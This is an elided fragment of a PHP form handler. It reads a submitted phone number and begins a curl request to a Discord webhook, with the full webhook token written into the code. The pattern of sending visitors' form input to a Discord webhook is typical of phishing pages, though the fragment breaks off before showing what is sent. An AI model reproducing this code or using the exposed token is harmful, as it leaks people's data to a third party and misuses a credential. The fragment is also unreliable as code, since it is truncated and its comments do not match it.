...
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    ...
    if (isset($_POST['Phone_Number'])) {
        $check_number = $_POST['Phone_Number'] ?? '';
        // Validate and sanitize the email input
...
{  die();
    ...
    $curl = curl_init();
    curl_setopt_array($curl, array(
        CURLOPT_URL => 'https://discord.com/api/webhooks/1263485101166301187/Kfxw0Y9p0omQfzADm2O-kataZDh2siPDN_4ZA7FdTv4yDmm8tjDtN8tn39Uos7AjarHJ',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 0,
